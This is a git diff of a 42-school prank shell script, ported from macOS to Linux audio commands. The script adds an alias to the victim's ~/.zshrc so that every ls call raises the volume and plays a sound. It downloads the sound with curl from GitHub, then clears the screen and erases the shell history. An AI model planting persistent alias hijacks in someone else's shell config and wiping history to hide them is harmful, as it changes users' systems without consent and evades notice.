@@ -1,12 +1,12 @@
 # **************************************************************************** #
 #                                                           LE - /             #
 #                                                               /              #
-#    troll.sh                                         .::    .:/ .      .::    #
+#    troll_zsh.sh                                       :+:      :+:    :+:    #
 #                                                  +:+:+   +:    +:  +:+:+     #
 #    By: amonteli <marvin@le-101.fr>                +:+   +:    +:    +:+      #
 #                                                  #+#   #+    #+    #+#       #
 #    Created: 2019/07/09 18:50:13 by amonteli     #+#   ##    ##    #+#        #
-#    Updated: 2019/07/11 15:57:07 by cgarrot     ###    #+. /#+    ###.fr      #
+#    Updated: 2022/04/22 15:00:04 by ldournoi         ###   ########.fr        #
 #                                                          /                   #
 #                                                         /                    #
 # **************************************************************************** #
@@ -17,9 +17,8 @@ then
 fi
 
 touch ~/.zshrc
-(osascript -e "set volume output volume 100" &)
-echo "alias ls='(afplay --volume 255 ~/.gg.mp3 &) ; ls $1'" >> ~/.zshrc
-curl https://raw.githubusercontent.com/iSnkh/Troll_42/master/sound/gg.mp3 -o ~/.gg.mp3
+echo "alias ls='(pactl set-sink-mute 0 1 && pactl set-sink-mute 0 0 && pactl set-sink-volume 0 75% && paplay ~/.gg.wav &) ; ls $1'" >> ~/.zshrc
+curl https://raw.githubusercontent.com/clinche/Troll_42/master/sound/gg.wav -o ~/.gg.wav
 clear
 history -c
 exec zsh
